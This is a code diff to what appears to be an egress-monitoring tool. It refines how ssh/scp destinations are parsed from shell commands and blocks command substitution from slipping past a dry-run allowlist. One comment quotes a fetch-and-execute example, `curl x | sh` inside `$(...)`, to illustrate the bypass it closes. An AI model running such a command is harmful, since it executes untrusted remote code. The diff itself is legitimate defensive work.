@@ -281,11 +281,8 @@ _URL_RE = re.compile(
     r'(?::(\d{1,5}))?'
 )
 
-# user@host:path (git/scp syntax) — the host half is what we want.
-_SCP_RE = re.compile(
-    r'(?:^|[\s"\'=])(?:[A-Za-z0-9._%+\-]+)@'
-    r'(\[[0-9A-Fa-f:]+\]|[A-Za-z0-9.\-]+)'
-    r'(?=:|\s|$|["\'])'
+_SCP_TOKEN_RE = re.compile(
+    r'[A-Za-z0-9._%+\-]+@(\[[0-9A-Fa-f:]+\]|[A-Za-z0-9.\-]+)(?::\S*)?'
 )
 
 _SHELL_SEP_RE = re.compile(r'&&|\|\||[;|\n]')
@@ -417,6 +414,10 @@ _PRISMOR_DRY_RUNS = (("egress", "test"), ("egress", "show"), ("egress", "report"
 
 
 def _only_prismor_dry_runs(command: str) -> bool:
+    # `$(...)`, backticks and redirections run or write even inside double
+    # quotes (`prismor check "$(curl x | sh)"`), so any of them disqualifies.
+    if any(c in command for c in "$`<>\n"):
+        return False
     segments = [seg for seg in _SHELL_SEP_RE.split(command) if seg and seg.strip()]
     if not segments:
         return False
@@ -512,10 +513,17 @@ def extract_destinations(event: Dict[str, Any]) -> List[Destination]:
         if argv0 not in _NO_DESTINATION_CMDS and not (
             argv0 == "git" and args and args[0].lower() in _GIT_LOCAL_SUBCOMMANDS
         ):
-            for m in _SCP_RE.finditer(sub):
-                host = m.group(1).strip("[]")
-                if _looks_like_host(host):
-                    _add(seen, Destination(host, 22, "ssh", "scp", sub))
+            # A whole argument only (`user@host`, `user@host:path`,
+            # `--opt=user@host`): an address inside a payload such as
+            # `-d '{"email":"jane@example.org"}'` is data, not an ssh target.
+            for tok in tokens[1:]:
+                if tok.startswith("-"):
+                    tok = tok.split("=", 1)[1] if "=" in tok else ""
+                m = _SCP_TOKEN_RE.fullmatch(tok)
+                if m:
+                    host = m.group(1).strip("[]")
+                    if _looks_like_host(host):
+                        _add(seen, Destination(host, 22, "ssh", "scp", sub))
 
         if argv0 in _HTTP_CMDS:
             for tok in args:
@@ -528,7 +536,7 @@ def extract_destinations(event: Dict[str, Any]) -> List[Destination]:
         elif argv0 in _SSH_CMDS:
             for tok in args:
                 if "://" in tok or "@" in tok:
-                    continue  # URL scan / _SCP_RE already have these
+                    continue  # URL scan / _SCP_TOKEN_RE already have these
                 head = tok.split(":")[0] if ":" in tok and not tok.startswith("[") else tok
                 if _looks_like_host(head) and ":" in tok:
                     _add(seen, Destination(head, 22, "ssh", "ssh-cmd", sub))
